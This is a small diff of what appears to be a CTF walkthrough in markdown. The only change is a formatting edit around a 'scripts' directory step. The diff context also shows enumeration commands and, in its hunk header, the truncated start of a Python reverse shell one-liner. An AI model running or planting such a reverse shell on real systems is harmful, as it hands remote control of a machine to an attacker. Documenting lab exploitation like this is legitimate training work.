@@ -41,7 +41,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 + `ls -la`
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/896f8a81-478c-41a0-a6e9-5729b1894204)
 
-+ `scripts` directory is interesting: `cd scripts`
++ **scripts** directory is interesting: `cd scripts`
 + `ls -la`
 + `cat test.py`
 + `cat test.txt`
